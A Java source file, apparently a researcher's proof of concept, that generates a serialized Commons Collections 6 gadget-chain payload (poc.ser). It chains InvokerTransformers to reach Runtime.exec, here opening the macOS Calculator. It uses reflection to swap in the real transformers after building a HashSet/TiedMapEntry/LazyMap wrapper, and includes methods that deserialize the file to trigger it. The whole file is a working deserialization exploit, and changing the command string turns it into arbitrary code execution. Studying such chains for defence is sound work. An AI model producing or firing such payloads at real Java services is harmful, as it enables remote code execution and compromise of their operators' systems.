import jdk.nashorn.internal.runtime.regexp.JoniRegExp;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.swing.*;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class GenCC6 {
    public static void main(String[] args) throws Exception {
        serial();
//        unserial();
    }

    public static void serial() throws Exception{
        Transformer[] fakeTransformers = {new ConstantTransformer(1)};
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/Calculator.app"}),
                new ConstantTransformer(1)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
        HashMap hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, 1);

        HashSet hashSet = new HashSet();
        hashSet.add(tiedMapEntry);

        lazyMap.remove(1);
        Field iTransformers = chainedTransformer.getClass().getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        Field modifiers = iTransformers.getClass().getDeclaredField("modifiers");
        modifiers.setAccessible(true);
        modifiers.setInt(iTransformers,iTransformers.getModifiers()& ~Modifier.FINAL);
        iTransformers.set(chainedTransformer,transformers);

        FileOutputStream fileOutputStream = new FileOutputStream("poc.ser");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(hashSet);
    }

    public static void unserial() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("poc.ser");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }

    public static void debug_cc6() throws Exception{
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(new File("poc.ser")));
        objectInputStream.readObject();
    }
}
